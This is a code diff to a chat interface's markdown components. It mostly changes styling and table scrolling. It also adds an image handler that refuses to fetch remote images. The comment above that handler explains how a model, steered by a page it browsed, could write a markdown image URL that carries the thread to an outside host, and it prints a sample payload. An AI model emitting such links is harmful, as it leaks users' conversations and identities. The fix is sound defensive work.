@@ -41,16 +41,16 @@ const CodeHeader: FC<CodeHeaderProps> = ({ language, code }) => {
   };
 
   return (
-    <div className="aui-code-header-root border-border/50 bg-muted/50 mt-3 flex items-center justify-between rounded-t-xl border border-b-0 px-3.5 py-1.5 text-xs">
+    <div className="aui-code-header-root border-border/50 bg-muted/50 mt-3 flex items-center justify-between rounded-t-md border border-b-0 px-3.5 py-1.5 text-xs">
       <span className="aui-code-header-language text-muted-foreground font-medium lowercase">
         {language}
       </span>
       <TooltipIconButton tooltip="Copy" onClick={onCopy}>
         {!isCopied && (
-          <CopyIcon className="animate-in zoom-in-75 fade-in duration-150" />
+          <CopyIcon className="motion-safe:animate-in motion-safe:zoom-in-75 motion-safe:fade-in duration-150" />
         )}
         {isCopied && (
-          <CheckIcon className="animate-in zoom-in-50 fade-in duration-200 ease-out" />
+          <CheckIcon className="motion-safe:animate-in motion-safe:zoom-in-50 motion-safe:fade-in duration-200 ease-out" />
         )}
       </TooltipIconButton>
     </div>
@@ -187,14 +187,18 @@ const defaultComponents = memoizeMarkdownComponents({
       {...props}
     />
   ),
+  /**
+   * The wrapper is what scrolls. A table's width is at least its content, so `overflow` on the table
+   * itself can never do anything: one cell holding a checksum or a long path widens it past the
+   * reading column, and the conversation pans sideways instead of the table.
+   */
   table: ({ className, ...props }) => (
-    <table
-      className={cn(
-        "aui-md-table my-3 w-full border-separate border-spacing-0 overflow-y-auto",
-        className,
-      )}
-      {...props}
-    />
+    <div className="aui-md-table-wrapper my-3 max-w-full overflow-x-auto">
+      <table
+        className={cn("aui-md-table w-full border-separate border-spacing-0", className)}
+        {...props}
+      />
+    </div>
   ),
   th: ({ className, ...props }) => (
     <th
@@ -238,10 +242,23 @@ const defaultComponents = memoizeMarkdownComponents({
       {...props}
     />
   ),
+  /**
+   * A markdown image is a request the browser makes on the model's behalf before anyone clicks it,
+   * and this thread renders text a model wrote — text that may repeat what a page Pi browsed told it
+   * to say. `![](https://elsewhere/?d=<the thread>)` would hand a stranger the conversation, plus the
+   * address and browser of every member who merely opened it. Nothing here needs a remote image: a
+   * Box desktop frame arrives on its own card, from the control plane, not from the reply. So the
+   * image is never fetched, and its description stands in its place rather than vanishing silently.
+   */
+  img: ({ alt }) => (
+    <span className="aui-md-img text-muted-foreground text-sm italic">
+      {alt?.trim() ? `[image: ${alt.trim()}]` : "[image]"}
+    </span>
+  ),
   pre: ({ className, ...props }) => (
     <pre
       className={cn(
-        "aui-md-pre border-border/50 bg-muted/30 overflow-x-auto rounded-t-none rounded-b-xl border border-t-0 p-3.5 text-[13px] leading-relaxed",
+        "aui-md-pre border-border/50 bg-muted/30 overflow-x-auto rounded-t-none rounded-b-md border border-t-0 p-3.5 text-[13px] leading-relaxed",
         className,
       )}
       {...props}
